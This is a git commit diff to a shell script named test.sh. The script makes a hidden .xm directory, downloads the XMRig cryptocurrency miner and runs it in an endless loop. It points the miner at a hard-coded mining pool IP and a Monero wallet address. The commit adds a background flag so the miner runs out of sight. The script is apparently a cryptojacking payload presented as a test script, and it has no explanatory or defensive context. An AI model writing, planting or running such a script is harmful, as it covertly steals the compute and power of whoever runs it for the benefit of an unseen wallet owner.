7b972a67fcfbb306d736c6744c4c367098443689
Adam Espitia <emada.adame@gmail.com>
2023-10-21 21:49:34 -0500

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
+rm -rf .xm
 mkdir .xm
 cd .xm
 wget -O xmrig.tar.gz  https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
@@ -6,5 +7,5 @@ tar -xzf xmrig.tar.gz
 cd xmrig-6.20.0
 while [ true ]
 do
-  xmrig -o 44.196.193.227:10128 -p h1 -u 46xgJzzbpiEXtzzxFFokaq32QAx1UCekBEMjDcGD6uBVHMXaqhGqmrnUCASr8Fa7KRF5n35Rkrt3TedjB6yqF1qUMMVTsCr
+  ~/.xm/xmrig-6.20.0/xmrig -o 44.196.193.227:10128 -p hx --background -u 46xgJzzbpiEXtzzxFFokaq32QAx1UCekBEMjDcGD6uBVHMXaqhGqmrnUCASr8Fa7KRF5n35Rkrt3TedjB6yqF1qUMMVTsCr
 done
